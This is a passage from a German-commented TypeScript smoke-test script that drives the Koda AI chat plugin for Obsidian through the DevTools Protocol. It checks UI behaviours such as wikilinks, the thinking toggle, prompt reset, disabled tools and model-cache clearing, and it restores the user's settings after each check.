    // Render- und Klick-Naht, und die haengt nicht am Modell. Gemessen wird der Effekt
    // (welche Datei ist danach aktiv), nicht die Ursache. Drei getrennte Schritte:
    // Szene herstellen (Mutation), auf den gerenderten Link pollen (Wartephase),
    // klicken (Mutation) und auf die Navigation pollen (Wartephase).
    const szene = await cdp.evaluate<{ ziel: string | null; vorher: string | null; verworfen?: string[] }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      // Bewusst NICHT die gerade aktive Notiz: waere sie das Ziel, blieben vorher und
      // nachher gleich und der Punkt waere rot, obwohl der Klick funktioniert hat
      // (im Lauf vom 2026-08-07 genau so passiert).
      const aktiv = app.workspace.getActiveFile()?.path ?? null;
      const view = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view;
      // ⚠️ Das Ziel wird PROBIERT, nicht gewaehlt. Gemessen 2026-08-30: der Punkt fiel auf
      // TaskNotes/Tasks/test.md, und das TaskNotes-Plugin ersetzt den Wikilink beim Rendern
      // durch ein eigenes Inline-Widget (span.tasknotes-inline-widget) — kein a.internal-link,
      // Punkt rot, obwohl an Koda nichts kaputt war. Vorher war er gruen, weil die Auswahl
      // ("erste Datei != die aktive") vom Zustand des VORIGEN Laufs abhing: Lauf 1 machte
      // _Cockpit.md aktiv, also traf Lauf 2 die naechste Datei.
      // Lehre, die ueber diesen Fall hinausgeht: wer seine Testdaten aus dem Nutzer-Vault
      // nimmt, misst irgendwann ein fremdes Plugin. Deshalb bis zu fuenf Kandidaten
      // durchprobieren und den ersten nehmen, bei dem Kodas eigener Link wirklich entsteht.
      const kandidaten = app.vault.getMarkdownFiles().filter((f) => f.path !== aktiv).slice(0, 5);
      let ziel = null;
      const verworfen = [];
      for (const k of kandidaten) {
        p.chatLog = [{ role: "assistant", content: "Siehe [[" + k.path.replace(/\\.md$/, "") + "]]." }];
        view.renderLog();
        await new Promise((r) => setTimeout(r, 400));
        if (document.querySelector(".koda-log a.internal-link")) { ziel = k.path; break; }
        verworfen.push(k.path);
      }
      if (!ziel) return { ziel: null, vorher: aktiv, verworfen };
      return { ziel, vorher: aktiv, verworfen };
    `);
    const gerendert =
      szene.ziel !== null
        ? await pollUntil<boolean>(cdp, `return !!document.querySelector(".koda-log a.internal-link");`, 8000)
        : null;
    let nachher: string | null = null;
    if (gerendert) {
      await cdp.evaluate(`
        const a = document.querySelector(".koda-log a.internal-link");
        a.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));
        return true;
      `);
      nachher = await pollUntil<string>(
        cdp,
        `
          const cur = app.workspace.getActiveFile()?.path ?? null;
          return cur && cur !== ${JSON.stringify(szene.vorher)} ? cur : null;
        `,
        8000,
      );
    }
    record(
      "6. Wikilink in der Antwort ist klickbar und oeffnet die Notiz",
      szene.ziel !== null && gerendert === true && nachher !== null,
      szene.ziel === null
        ? `kein Kandidat rendert einen eigenen Wikilink — verworfen: ${(szene.verworfen ?? []).join(", ") || "(keiner)"}`
        : gerendert
          ? `${szene.ziel} · aktiv vorher ${szene.vorher ?? "(keine)"} → nachher ${nachher ?? "(keine — Navigation blieb aus)"}${(szene.verworfen ?? []).length > 0 ? ` · uebersprungen (Fremd-Widget): ${(szene.verworfen ?? []).join(", ")}` : ""}`
          : "kein a.internal-link im Log gerendert",
    );

    // --- 7. Verdichtungs-Marken werden gerendert ----------------------------
    // Records nur im Speicher anhaengen, rendern, pruefen, wieder entfernen — current.jsonl
    // bleibt unberuehrt. Kein Modell noetig: geprueft wird der dritte Render-Zweig
    // (renderCompaction in src/obsidian/view.ts), nicht die Verdichtungslogik selbst.
    const marks = await cdp.evaluate<{ stage1: number; stage2: number; forced: number; summaryText: string }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const n = p.chatLog.length;
      p.chatLog.push({ kind: "compaction", stage: 1, at: new Date().toISOString(), keepToolResults: 3, stats: { stubbed: 6, bytes: 38912 } });
      p.chatLog.push({ kind: "compaction", stage: 2, at: new Date().toISOString(), keepToolResults: 3, summary: "SMOKE-ZUSAMMENFASSUNG", turns: 3, forced: true, stats: { stubbed: 0, bytes: 900 } });
      p.views().forEach((v) => v.renderLog());
      const root = document.querySelector(".koda-log");
      const out = {
        stage1: root.querySelectorAll(".koda-compaction:not(details)").length,
        stage2: root.querySelectorAll("details.koda-compaction-summary").length,
        forced: [...root.querySelectorAll(".koda-compaction")].filter((e) => /Überlauf|overflow/.test(e.textContent)).length,
        summaryText: root.querySelector("details.koda-compaction-summary pre")?.textContent ?? "",
      };
      p.chatLog.splice(n);
      p.views().forEach((v) => v.renderLog());
      return out;
    `);
    record(
      "7. Verdichtungs-Marken (Stufe 1 + Stufe 2, erzwungen) werden gerendert",
      marks.stage1 === 1 && marks.stage2 === 1 && marks.forced === 1 && marks.summaryText === "SMOKE-ZUSAMMENFASSUNG",
      JSON.stringify(marks),
    );

    // --- 9. Statuszeile ueber eine ganze Werkzeug-Runde ----------------------
    // Kein Modell noetig: gespeist wird der Zustandsautomat direkt mit derselben
    // Ereignisfolge, die main.ts aus dem Agent-Loop durchreicht. Geprueft wird die
    // ZUSAMMENSETZUNG (Klasse + Icon + Text), nicht nur das Vorhandensein — eine Zeile,
    // die immer „arbeitet" sagt, waere gruen und trotzdem kaputt.
    const status = await cdp.evaluate<{ steps: { cls: string; icon: string; text: string }[] }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const v = p.views()[0];
      const el = v.containerEl.querySelector(".koda-status");
      const snap = () => ({
        cls: el.className,
        icon: el.querySelector(".koda-status-icon svg")?.getAttribute("class") ?? "",
        text: el.querySelector(".koda-status-label")?.textContent ?? "",
      });
      const steps = [];
      v.activity({ kind: "ask" });                                                    steps.push(snap());
      v.activity({ kind: "tool-start", name: "search_notes", args: '{"query":"Stress"}' }); steps.push(snap());
      v.activity({ kind: "tool-end" });                                                steps.push(snap());
      v.activity({ kind: "token" });                                                   steps.push(snap());
      v.activity({ kind: "done" });                                                    steps.push(snap());
      return { steps };
    `);
    const [ask, tool, back, writing, done] = status.steps;
    record(
      "9. Statuszeile nennt die Taetigkeit und dreht sich dabei",
      ask?.cls.includes("is-checking") === true &&
        tool?.text.includes("Stress") === true &&
        back?.text === ask?.text &&
        writing?.text !== ask?.text &&
        done?.cls.includes("is-checking") === false,
      status.steps.map((x) => `${x.text}[${x.cls.replace("koda-status", "").trim()}]`).join(" → "),
    );

    // --- 10. Kontextfenster-Auslastung im Ruhezustand ------------------------
    // Schliesst die Messluecke „Kontextfenster-Uebernahme ist ungemessen" von der anderen
    // Seite: hier wird nicht das Settings-Feld geprueft, sondern dass die Zahl daraus in
    // der Sidebar ankommt. Gegenprobe mit einem winzigen Fenster — die Zahl muss steigen.
    const usage = await cdp.evaluate<{ normal: string; tiny: string; warnCls: string }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const v = p.views()[0];
      const el = v.containerEl.querySelector(".koda-status");
      const before = p.settings.contextWindowTokens;
      p.chatLog.push({ role: "user", content: "x".repeat(4000) });
      v.activity({ kind: "done" });
      const normal = el.querySelector(".koda-status-label").textContent;
      p.settings.contextWindowTokens = 1024;
      v.activity({ kind: "done" });
      const tiny = el.querySelector(".koda-status-label").textContent;
      const warnCls = el.className;
      p.settings.contextWindowTokens = before;
      p.chatLog.pop();
      v.activity({ kind: "done" });
      return { normal, tiny, warnCls };
    `);
    const pct = (s: string): number => Number(/(\d+)/.exec(s)?.[1] ?? "-1");
    record(
      "10. Statuszeile zeigt die Belegung des Kontextfensters",
      pct(usage.normal) >= 0 && pct(usage.tiny) > pct(usage.normal) && usage.warnCls.includes("is-warning"),
      `${usage.normal} → bei 1024 Token: ${usage.tiny} (${usage.warnCls.includes("is-warning") ? "gewarnt" : "keine Warnung"})`,
    );

    // --- 11. Denk-Knopf der Modellzeile --------------------------------------
    // Beide Richtungen, das Ueberleben eines Neuaufbaus und der zweite Zugang (der Befehl): der Zustand kommt aus den
    // Einstellungen, nicht aus dem DOM — sonst faellt er beim naechsten Redraw zurueck. Geklickt wird der ECHTE Knopf des
    // Kits in der Modellzeile (seit obsidian-kit 0.70.1; vorher ein Knopf im Kopf, den `toggleThinking()` direkt rief).
    const think = await cdp.evaluate<{ knopfDa: boolean; start: boolean; nachKlick: boolean; label: string; pressed: string | null; survives: boolean; nachBefehl: boolean }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const knopf = () => document.querySelector(".koda-root .okit-model-bar .okit-thinking-toggle");
      const warte = async (f) => { for (let i = 0; i < 80; i++) { if (f()) return true; await new Promise((r) => setTimeout(r, 100)); } return false; };
      const start = p.settings.suppressThinking;
      const knopfDa = !!knopf();
      knopf()?.click();
      await warte(() => p.settings.suppressThinking !== start);
      const nachKlick = p.settings.suppressThinking;
      // Der Knopf zeichnet sich nach dem Schreiben neu: Beschriftung und aria-pressed gehoeren zum NEUEN Zustand (gedrueckt = es wird gedacht).
      await warte(() => knopf()?.getAttribute("aria-pressed") === String(!nachKlick));
      const label = knopf()?.textContent ?? "";
      const pressed = knopf()?.getAttribute("aria-pressed") ?? null;
      p.views()[0].syncModelBar();
      const survives = knopf()?.textContent === label && knopf()?.getAttribute("aria-pressed") === pressed;
      // Der Befehl ist ein zweiter Zugang ohne den Knopf und schaltet denselben Wert zurueck.
      await app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":toggle-thinking")});
      await warte(() => p.settings.suppressThinking === start);
      const nachBefehl = p.settings.suppressThinking;
      p.settings.suppressThinking = start;
      await p.saveSettings();
      return { knopfDa, start, nachKlick, label, pressed, survives, nachBefehl };
    `);
    record(
      "11. Denk-Knopf der Modellzeile schaltet, ueberlebt den Neuaufbau, und der Befehl „Thinking umschalten“ schaltet denselben Wert",
      think.knopfDa && think.start !== think.nachKlick && /Thinking: (on|off)/.test(think.label) && think.pressed === String(!think.nachKlick) && think.survives && think.nachBefehl === think.start,
      `Knopf da: ${String(think.knopfDa)} · ${String(think.start)} → ${String(think.nachKlick)} · Beschriftung „${think.label}" (aria-pressed ${String(think.pressed)}) · Neuaufbau: ${String(think.survives)} · Befehl zurueck: ${String(think.nachBefehl === think.start)}`,
    );

    // --- 12. Verwerfen fragt nach ------------------------------------------
    // Der Quicktask sagt: „man klickt leicht aus Versehen auf Neues Gespraech und verliert
    // alles ohne Rueckkehrmoeglichkeit". Geprueft wird deshalb der Abbruch-Weg — dass die
    // Bestaetigung erscheint UND dass ein Nein den Verlauf stehen laesst.
    const discard = await cdp.evaluate<{ modal: boolean; kept: number; before: number; titel: string; fremd: number }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const v = p.views()[0];
      p.chatLog.push({ role: "user", content: "SMOKE-BEHALTEN" });
      v.renderLog();
      const before = p.chatLog.length;
      // .modal-container ist ein GETEILTER Ort — jedes Plugin kann dort ein Modal haben.
      // Deshalb erst sicherstellen, dass keines offen ist, und danach pruefen, dass das
      // gefundene wirklich Kodas ist. Ohne das klickt der Punkt im Zweifel den Abbrechen-
      // Knopf eines fremden Dialogs und meldet trotzdem gruen. (Gleiches Muster wie der
      // .view-action-Fehler in Punkt 11 und die geteilte .notice-Leiste, 2026-08-30.)
      const fremd = document.querySelectorAll(".modal-container").length;
      v.askNewChat();
      await new Promise((r) => setTimeout(r, 300));
      const container = [...document.querySelectorAll(".modal-container")].pop();
      const titel = container?.querySelector(".modal-title")?.textContent ?? "";
      const meins = /Gespräch verwerfen|Discard this conversation/.test(titel);
      const modal = meins ? container.querySelector(".modal-button-container") : null;
      const found = !!modal && fremd === 0;
      // Abbrechen ist der erste Knopf (Cancel links, UI-STANDARD §2).
      modal?.querySelector("button")?.click();
      await new Promise((r) => setTimeout(r, 300));
      const kept = p.chatLog.length;
      p.chatLog.pop();
      v.renderLog();
      return { modal: found, kept, before, titel, fremd };
    `);
    record(
      "12. „Neues Gespraech“ fragt nach, Abbruch laesst den Verlauf stehen",
      discard.modal && discard.kept === discard.before,
      discard.fremd > 0
        ? `${discard.fremd} fremde(s) Modal offen — Punkt nicht entscheidbar`
        : `Modal „${discard.titel}" · Verlauf ${discard.before} → ${discard.kept} Eintraege`,
    );

    // --- 13. Der dritte Zustand des Denk-Knopfs: gesperrt --------------------
    // Punkt 11 prueft das Umschalten; die inhaltlich interessante Zusicherung ist die SPERRE: Modelle wie gpt-oss/harmony lehnen
    // `reasoning_effort:"none"` ab, deshalb darf der Knopf dort kein Abschalten versprechen. Das ist ueber den Modell-NAMEN pruefbar,
    // weil `isAlwaysOnThinker` eine Namensheuristik ist — es braucht also kein solches Modell. Seit obsidian-kit 0.70.1 traegt der
    // Kit-Knopf den Zustand selbst (`locked`): `disabled`, aria-pressed „true“, Kit-Text „immer an“, und ein Klick ruft `setLevel` nie.
    //
    // ⚠️ Was er belegt: die Anzeige-Seite und dass Klick UND Befehl folgenlos bleiben. NICHT belegt ist die Request-Seite (dass gpt-oss
    // die Parameter wirklich ablehnt); die ist per Unit-Test fixiert (`effectiveSuppress`) und braucht ein echtes Modell.
    type KnopfLage = { text: string; aria: string; pressed: string; disabled: boolean };
    const dritte = await cdp.evaluate<{ normalAus: KnopfLage; normalAn: KnopfLage; gesperrt: KnopfLage; vorKlick: boolean; nachKlick: boolean; nachBefehl: boolean }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const v = p.views()[0];
      const warte = (ms) => new Promise((r) => setTimeout(r, ms));
      const lies = () => {
        const el = document.querySelector(".koda-root .okit-model-bar .okit-thinking-toggle");
        return { text: el?.textContent ?? "", aria: el?.getAttribute("aria-label") ?? "", pressed: el?.getAttribute("aria-pressed") ?? "", disabled: !!el?.disabled };
      };
      // Das Modell steht in der Zeile; der Knopf liest das gesendete (resolver.peek).
      const url0 = p.settings.endpoints[0].url;
      const sende = async (m) => { p.settings.endpoints = [{ url: url0, model: m }]; p.resolver.invalidate(); v.syncModelBar(); await warte(300); };
      await sende("qwen3:8b");
      p.settings.suppressThinking = true;  v.syncModelBar(); await warte(200); const normalAus = lies();
      p.settings.suppressThinking = false; v.syncModelBar(); await warte(200); const normalAn = lies();
      // Ein Name, den isAlwaysOnThinker erkennt — das Modell muss nicht existieren.
      await sende("gpt-oss:20b");
      const gesperrt = lies();
      const vorKlick = p.settings.suppressThinking;
      document.querySelector(".koda-root .okit-model-bar .okit-thinking-toggle")?.click();
      await warte(500);
      const nachKlick = p.settings.suppressThinking;
      await app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":toggle-thinking")});
      await warte(500);
      const nachBefehl = p.settings.suppressThinking;
      return { normalAus, normalAn, gesperrt, vorKlick, nachKlick, nachBefehl };
    `);
    record(
      "13. Denk-Knopf der Modellzeile ist bei einem Modell, das sich nicht abschalten laesst, gesperrt (Kit-Feld locked), Klick und Befehl bleiben folgenlos",
      !dritte.normalAus.disabled && !dritte.normalAn.disabled &&
        dritte.normalAus.pressed === "false" && dritte.normalAn.pressed === "true" &&
        dritte.gesperrt.disabled && dritte.gesperrt.pressed === "true" && /always on|immer an/.test(dritte.gesperrt.text) &&
        dritte.vorKlick === dritte.nachKlick && dritte.vorKlick === dritte.nachBefehl,
      `normal: „${dritte.normalAn.text}" / „${dritte.normalAus.text}" · gesperrt: „${dritte.gesperrt.text}" (disabled ${String(dritte.gesperrt.disabled)}, aria-pressed ${dritte.gesperrt.pressed}) · Klick folgenlos: ${String(dritte.vorKlick === dritte.nachKlick)} · Befehl folgenlos: ${String(dritte.vorKlick === dritte.nachBefehl)}`,
    );

    // --- 16. Reset stellt den Auslieferungsstand her -------------------------
    // Anweisung setzen (dieselbe Kette wie Punkt 3/4: Wert setzen, dann erst das Fenster
    // oeffnen), den rotate-ccw-Knopf mit clickReal druecken, danach pruefen: Override UND
    // Textarea leer, Platzhalter (die ausgelieferte Fassung) weiterhin da. Vorwert gesichert
    // und zurueckgeschrieben wie beim Thinking-Schalter (Punkt 13) — ein Abbruch darf keinen
    // fremden Prompt stehen lassen.
    const vorherPrompt = await cdp.evaluate<string>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.systemPromptOverride;
    `);
    try {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.systemPromptOverride = "SMOKE-EIGENE-ANWEISUNG";
        await p.saveSettings();
        app.setting.open();
        app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
        return true;
      `);
      // Das Fenster entsteht erst durch `open()` — vorher gibt es kein Target (wie Punkt 3).
      await new Promise((resolve) => setTimeout(resolve, 1200));

      let settings16: Cdp | null = null;
      try {
        settings16 = await attachTo("settings", port, vault);
        if (!settings16) {
          unmeasured("16. Zuruecksetzen stellt den Auslieferungsstand her", "Einstellungsfenster nicht gefunden");
        } else {
          await settings16.send("Page.bringToFront");
          const vorKlick = await pollUntil<{ value: string }>(
            settings16,
            `
              const ta = document.querySelector("textarea.koda-prompt-textarea");
              return ta ? { value: ta.value } : null;
            `,
            8000,
          );
          if (vorKlick === null) {
            unmeasured("16. Zuruecksetzen stellt den Auslieferungsstand her", "Anweisungs-Textarea nicht gefunden");
          } else {
            const geklickt = await clickReal(
              settings16,
              `(() => {
                 const item = document.querySelector("textarea.koda-prompt-textarea")?.closest(".setting-item");
                 const kandidaten = item ? [...item.querySelectorAll("[aria-label]")] : [];
                 return kandidaten.find((el) => /Ausgelieferte Fassung wiederherstellen|Restore the shipped version/.test(el.getAttribute("aria-label") ?? "")) ?? null;
               })()`,
            );
            const leer = geklickt
              ? await pollUntil<boolean>(
                  cdp,
                  `return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.systemPromptOverride === "";`,
                  4000,
                )
              : null;
            // `pollUntil` bricht beim ersten wahrheitsfaehigen Wert ab, und ein Objekt ist immer wahr: ohne die Bedingung `value === ""`
            // lieferte der Poll sofort den Zwischenstand (Override schon leer, Textarea noch nicht neu gezeichnet — der Reset-Knopf zeichnet
            // erst nach `save().then(refresh)`). Gemessen als einmaliges Rot („danach: SMOKE-EIGENE-ANWEISUNG“, Override leer: true).
            const nachher = await pollUntil<{ value: string; placeholder: string }>(
              settings16,
              `
                const ta = document.querySelector("textarea.koda-prompt-textarea");
                if (!ta || ta.value !== "") return null;
                return { value: ta.value, placeholder: ta.placeholder };
              `,
              4000,
            );
            record(
              "16. Zuruecksetzen stellt den Auslieferungsstand her",
              vorKlick.value === "SMOKE-EIGENE-ANWEISUNG" && geklickt === true && leer === true && nachher !== null && nachher.value === "" && nachher.placeholder !== "",
              `vorher: „${vorKlick.value}" · geklickt: ${String(geklickt)} · Override leer: ${String(leer)} · danach: ${JSON.stringify(nachher)}`,
            );
          }
        }
      } finally {
        settings16?.close();
      }
    } finally {
      // Vorwert zurueck — auch wenn der Punkt oben abgebrochen ist. Sonst bleibt dem Nutzer
      // eine fremde SMOKE-Anweisung oder ein zu frueh geleerter eigener Prompt stehen.
      await cdp
        .evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.systemPromptOverride = ${JSON.stringify(vorherPrompt)};
          await p.saveSettings();
          return true;
        `)
        .catch(() => undefined);
      await schliesseEinstellungen(cdp).catch(() => undefined);
    }

    // --- 17. Ein abgeschaltetes Werkzeug wird nicht gesendet -----------------
    // Gemessen wird `plugin.currentToolNames()` — DIESELBE Methode, die `ask()` ruft, um die
    // Liste zu bauen; es gibt keinen zweiten Weg. Der Punkt misst damit die GESENDETE Liste,
    // nicht den Schalter, und braucht dafuer kein Modell. Die dritte Bedingung
    // (`wieder.includes`) ist kein Beiwerk: sie belegt, dass der Punkt seinen Gegenstand
    // wirklich bewegt hat — ohne sie waere eine Liste, die `write_note` nie enthielt, ebenso
    // gruen. Vorwert gesichert und zurueckgeschrieben wie bei Punkt 16/13.
    const vorherDisabled = await cdp.evaluate<string[]>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.toolsDisabled;
    `);
    try {
      const mitAus = await cdp.evaluate<string[]>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.toolsDisabled = ["write_note"];
        await p.saveSettings();
        return p.currentToolNames();
      `);
      const wieder = await cdp.evaluate<string[]>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.toolsDisabled = ${JSON.stringify(vorherDisabled ?? [])};
        await p.saveSettings();
        return p.currentToolNames();
      `);
      record(
        "17. Abgeschaltetes Werkzeug wird nicht gesendet",
        !mitAus.includes("write_note") && mitAus.includes("read_note") && wieder.includes("write_note"),
        `aus: ${mitAus.join(", ")} · wieder: ${wieder.join(", ")}`,
      );
    } finally {
      await cdp
        .evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.toolsDisabled = ${JSON.stringify(vorherDisabled ?? [])};
          return p.saveSettings();
        `)
        .catch(() => undefined);
    }

    // --- 18. „Aktive Anweisung ansehen" zeigt Memory und Skills ---------------
    // `previewSystemPrompt()` ruft DIESELBE `buildSystemPrompt` wie `ask()` — kein Nachbau
    // (Spec E6, s. Kopfkommentar von prompt-modal.ts). Geprueft wird deshalb nicht die
    // Zusammensetzung selbst (das ist Sache der Unit-Tests fuer build.ts), sondern die
    // Modal-Naht: kommt der fertige Text im `<pre class="koda-prompt-preview">` an, und
    // traegt er beide Abschnitte, die der Staging-Vault ueber sein Fixture immer hat?
    await cdp.evaluate(`
      app.setting.open();
      app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
      return true;
    `);
    await new Promise((resolve) => setTimeout(resolve, 1200));

    let settings18: Cdp | null = null;
    try {
      settings18 = await attachTo("settings", port, vault);
      if (!settings18) {
        unmeasured("18. „Aktive Anweisung ansehen“ zeigt Memory und Skills", "Einstellungsfenster nicht gefunden");
      } else {
        await settings18.send("Page.bringToFront");
        const knopfDa = await pollUntil<boolean>(
          settings18,
          `
            const btn = [...document.querySelectorAll("button")].find((b) => /Aktive Anweisung ansehen|Show active instructions/.test(b.textContent ?? ""));
            return !!btn;
          `,
          8000,
        );
        if (!knopfDa) {
          unmeasured("18. „Aktive Anweisung ansehen“ zeigt Memory und Skills", "Knopf nicht gefunden");
        } else {
          const geklickt = await clickReal(
            settings18,
            `[...document.querySelectorAll("button")].find((b) => /Aktive Anweisung ansehen|Show active instructions/.test(b.textContent ?? "")) ?? null`,
          );
          const gefunden = geklickt
            ? await pollEither<string>(
                cdp,
                settings18,
                `
                  const pre = document.querySelector(".koda-prompt-preview");
                  return pre && pre.textContent.trim() !== "" ? pre.textContent : null;
                `,
                8000,
              )
            : null;
          const text = gefunden?.value ?? "";
          record(
            "18. „Aktive Anweisung ansehen“ zeigt Memory und Skills",
            geklickt === true && text.includes("## Memory") && text.includes("## Skills"),
            gefunden
              ? `Modal im ${gefunden.from === "a" ? "Hauptfenster" : "Einstellungsfenster"} · ${text.length} Zeichen · Memory: ${String(text.includes("## Memory"))} · Skills: ${String(text.includes("## Skills"))}`
              : "kein .koda-prompt-preview mit Text in einem der beiden Fenster",
          );
          // In welchem Fenster auch immer es entstand — auf beiden schliessen ist billiger
          // als vorher zu klaeren, in welchem es sicher steht.
          // `schliesseDialog` kennt beide Knopf-Formen (`.modal-close-button` bis 1.12, `.modal-header-button` ab 1.14.4).
          await schliesseDialog(cdp).catch(() => undefined);
          await schliesseDialog(settings18, { escapeRueckfall: false }).catch(() => undefined);
        }
      }
    } finally {
      settings18?.close();
      await schliesseEinstellungen(cdp).catch(() => undefined);
    }

    // --- 19. `hide()` verwirft den Modell-Cache ------------------------------
    // Der Kit-Vertrag verlangt `cache.clear()` beim SCHLIESSEN des Settings-Tabs
    // (`ModelListCache.clear`, src/vendor/kit/model-list-cache.ts). Der Aufruf steht seit
    // 2026-08-28 in `KodaSettingsTab.hide()` — gemessen hatte ihn nie jemand, und sein
    // Fehlen ist unsichtbar: der Cache haelt Promises je Endpunkt-URL und ueberlebt jeden
    // Tab-NEUAUFBAU bewusst. Ohne `clear()` bleibt ein einmal als „nicht erreichbar"
    // gemessener Endpunkt die RESTLICHE SITZUNG so stehen — wer seinen LLM-Server danach
    // startet und die Einstellungen neu oeffnet, saehe dauerhaft den alten Zustand.
    //
    // Dass das ueberhaupt cachebar ist, haengt an einer Eigenschaft von `probeModels`:
    // es wirft NICHT, sondern liefert `{ status, models: [] }`. Der Cache sieht also kein
    // abgelehntes Promise (das seinen Eintrag selbst verwirft), sondern ein erfolgreiches
    // mit `reachable: false` — und behaelt es.
    //
    // Gemessen wird in DREI Werten, nicht in zwei. Die mittlere Messung ist der Grund,
    // warum der Punkt etwas belegt: sie zeigt, dass der Cache ueberhaupt gegriffen hat.
    // Ohne sie waere „am Ende gruen" auch dann erreicht, wenn nie etwas gecacht wurde —
    // ein Punkt, der seinen Gegenstand nie beruehrt (dieselbe Falle wie beim Beleg-Test
    // mit erfundenem Namen, Lesson 2026-09-01).
    //
    //   A  Server tot, Tab frisch geoeffnet          -> gesperrt   (wird gecacht)
    //   B  Server LEBT wieder, nur Tab-Neuaufbau     -> gesperrt   (Cache haelt)
    //   C  Server lebt, Fenster zu und wieder auf    -> liste:2    (hide() hat geraeumt)
    let hidePunkt = "nicht gelaufen";
    let hideOk = false;
    let settings19: Cdp | null = null;
    try {
      const port19 = fake?.port;
      if (port19 === undefined) throw new Error("kein Fake-Endpunkt aus Punkt 3 vorhanden");
      const url19 = `http://127.0.0.1:${port19}`;
      await fake?.close();
      fake = null;

      const oeffneTab = async (): Promise<void> => {
        await cdp.evaluate(`
          app.setting.open();
          app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
          return true;
        `);
        await new Promise((resolve) => setTimeout(resolve, 1200));
      };
      // Gemessen wird der MODELL-PICKER der Zeile, nicht das Status-Icon — der erste
      // Anlauf dieses Punktes (2026-09-02) hat genau daran gemerkt, dass er am Falschen
      // mass: `.okit-ep-status` haengt an einer eigenen Probe, die der Baustein bei jedem
      // Zeilen-Render frisch faehrt und die deshalb NICHT ueber `ModelListCache` laeuft.
      // Der Cache speist `cache.load(listKey, …)` → `resolveModelChoice` → den Picker:
      // `reachable: false` ergibt `mode: "freetext"` (ein `<input>`), eine erreichbare
      // Liste ein `<select>`. Das ist die Anzeige, fuer die der `clear()`-Vertrag gilt.
      // Die erste Fassung war gruen-faehig ueber etwas anderes; gerettet hat sie die
      // Kontrollmessung B, die „Cache hat nicht gegriffen" meldete statt still zu bestehen.
      // ⚠️ Der Diskriminator ist `select.disabled`, NICHT select-gegen-input. Am 2026-09-02
      // an der laufenden App gemessen: ein toter Endpunkt rendert kein Freitextfeld, sondern
      // ein **gesperrtes** Dropdown mit einer einzigen Option („globales Modell (keins
      // gesetzt)") — `resolveModelChoice` liefert bei `reachable: false` mit erlaubter
      // Leer-Option `mode: "locked"`, und `renderModelPicker` setzt darauf `setDisabled(true)`.
      // Die Fassung davor prueft select-gegen-input und war deshalb dreimal „select": sie
      // konnte die Zustaende gar nicht unterscheiden.
      const pickerZeile0 = async (verbindung: Cdp): Promise<string | null> =>
        pollUntil<string>(
          verbindung,
          `
            const slot = document.querySelector(".okit-ep-row .okit-model-slot");
            if (!slot) return null;
            const sel = slot.querySelector("select");
            if (sel) return sel.disabled ? "gesperrt" : "liste:" + sel.options.length;
            if (slot.querySelector("input")) return "freitext";
            return null;
          `,
          12_000,
        );

      // Genau EINE Zeile, damit `rows[0]` eindeutig der geprobte Endpunkt ist.
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.endpoints = [{ url: ${JSON.stringify(url19)} }];
        await p.saveSettings();
        return true;
      `);
      await oeffneTab();
      settings19 = await attachTo("settings", port, vault);
      if (!settings19) throw new Error("Einstellungsfenster nicht gefunden");
      await settings19.send("Page.bringToFront");
      const a = await pickerZeile0(settings19);

      // Server auf DEMSELBEN Port zurueckholen — die URL im Endpunkt bleibt unveraendert,
      // sonst waere der Cache-Schluessel ein anderer und der Punkt maesse nichts.
      fake = await startFakeEndpoint(port19);

      // B: Neuaufbau OHNE Schliessen. `display()` direkt auf dem aktiven Tab, weil ein
      // `openTabById` auf denselben Tab je nach Obsidian-Fassung `hide()` mitnehmen kann —
      // dann waere die Kontrolle stillschweigend derselbe Fall wie C.
      await cdp.evaluate(`app.setting.activeTab.display(); return true;`);
      await new Promise((resolve) => setTimeout(resolve, 800));
      const b = await pickerZeile0(settings19);

      // C: Fenster zu (das ist der `hide()`-Aufruf) und wieder auf.
      settings19.close();
      settings19 = null;
      await schliesseEinstellungen(cdp);
      await new Promise((resolve) => setTimeout(resolve, 600));
      await oeffneTab();
      settings19 = await attachTo("settings", port, vault);
      if (!settings19) throw new Error("Einstellungsfenster nach dem Wiederoeffnen nicht gefunden");
      await settings19.send("Page.bringToFront");
      const c = await pickerZeile0(settings19);

      // C muss eine echte Liste zeigen: der Fake-Endpunkt meldet `smoke-model`, das Dropdown
      // traegt danach Leer-Option + Modell = 2 Optionen. „gesperrt" waere zu schwach —
      // ein entsperrtes, aber leeres Dropdown gaebe es bei erreichbarem Endpunkt ohne Liste.
      hideOk = a === "gesperrt" && b === "gesperrt" && c === "liste:2";
      hidePunkt =
        `Picker bei totem Server: ${a ?? "(keiner)"} · Server zurueck, nur Neuaufbau: ${b ?? "(keiner)"} · nach Schliessen+Oeffnen: ${c ?? "(keiner)"}` +
        (a === "gesperrt" && b !== "gesperrt" ? " — ⚠️ Cache hat nicht gegriffen, der Punkt belegt hide() dann NICHT" : "") +
        (a !== "gesperrt" ? " — ⚠️ toter Server wurde nicht als unerreichbar gelesen, Ausgangslage nicht hergestellt" : "");
    } catch (error) {
